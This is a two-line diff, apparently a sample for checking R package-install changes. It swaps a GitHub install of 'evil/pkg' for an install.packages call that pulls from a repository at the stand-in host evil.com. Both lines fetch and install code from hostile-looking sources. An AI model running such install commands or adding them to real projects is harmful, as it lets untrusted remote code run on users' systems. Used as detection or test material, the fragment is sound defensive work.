@@ -1,1 +1,1 @@
-devtools::install_github("evil/pkg")
+install.packages("foo", repos = "https://evil.com/cran")
